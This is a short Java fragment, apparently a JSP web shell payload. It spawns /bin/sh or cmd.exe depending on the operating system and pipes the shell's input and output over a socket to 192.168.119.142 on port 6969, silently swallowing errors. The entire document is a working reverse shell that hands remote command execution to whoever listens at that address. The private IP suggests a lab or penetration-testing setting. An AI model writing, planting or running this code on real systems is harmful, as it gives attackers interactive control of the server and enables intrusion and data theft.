  class StreamConnector extends Thread
  {
    InputStream mp;
    OutputStream bl;

    StreamConnector( InputStream mp, OutputStream bl )
    {
      this.mp = mp;
      this.bl = bl;
    }

    public void run()
    {
      BufferedReader ec  = null;
      BufferedWriter hti = null;
      try
      {
        ec  = new BufferedReader( new InputStreamReader( this.mp ) );
        hti = new BufferedWriter( new OutputStreamWriter( this.bl ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ec.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hti.write( buffer, 0, length );
          hti.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ec != null )
          ec.close();
        if( hti != null )
          hti.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.142", 6969 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
